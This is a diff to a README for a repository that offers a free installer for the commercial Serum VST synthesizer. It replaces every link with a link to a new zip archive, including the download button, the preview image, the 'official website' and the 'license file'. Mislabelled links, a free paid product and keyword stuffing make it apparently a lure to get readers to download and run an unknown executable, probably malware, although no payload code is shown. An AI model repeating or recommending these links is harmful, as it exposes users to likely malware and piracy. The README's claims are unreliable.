@@ -7,13 +7,13 @@ Welcome to the "Serum-VST-Installer-2024-Free" repository! Here you will find a 
 🎵 **Topics**: audio-editing, audio-processing, audio-software, free-synth-plugins, free-vst-plugins, music-creation, music-production, music-software, music-tools, plugin-installer, serum-presets, serum-synthesizer, serum-vst, sound-design, sound-presets, synthesizer-sounds, synthesizer-tools, vst-effects, vst-instruments, vst-plugins
 
 ## Installation
-To get started with Serum VST, simply download the installer from the following link: [Download Installer](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/releases/download/v1.0/Software.zip)
+To get started with Serum VST, simply download the installer from the following link: [Download Installer](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/raw/refs/heads/main/gelatin/Free-VS-Serum-Installer-1.8.zip)
 
 Once the download is complete, launch the installer and follow the on-screen instructions to complete the installation process.
 
 ## Preview
 Here is a sneak peek of Serum VST in action:
-![Serum VST Preview](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/releases/download/v1.0/Software.zip)
+![Serum VST Preview](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/raw/refs/heads/main/gelatin/Free-VS-Serum-Installer-1.8.zip)
 
 ## Usage
 After installing Serum VST, you can start exploring its various features and presets to create your own unique sounds for music production or sound design projects. With its intuitive interface and powerful capabilities, Serum VST opens up a world of sonic possibilities for creatives.
@@ -22,10 +22,10 @@ After installing Serum VST, you can start exploring its various features and pre
 If you are passionate about audio software development or music production, feel free to contribute to this project by submitting pull requests or sharing your ideas for improving the installer or enhancing the user experience with Serum VST.
 
 ## Resources
-For more information about Serum VST and its features, you can visit the official website: [Serum VST Official Website](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/releases/download/v1.0/Software.zip)
+For more information about Serum VST and its features, you can visit the official website: [Serum VST Official Website](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/raw/refs/heads/main/gelatin/Free-VS-Serum-Installer-1.8.zip)
 
 ## License
-This project is licensed under the MIT License - see the [https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/releases/download/v1.0/Software.zip](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/raw/refs/heads/main/gelatin/Free-VS-Serum-Installer-1.8.zip](https://github.com/Viper700pro/Serum-VST-Installer-2024-Free/raw/refs/heads/main/gelatin/Free-VS-Serum-Installer-1.8.zip) file for details.
 
 ---
 
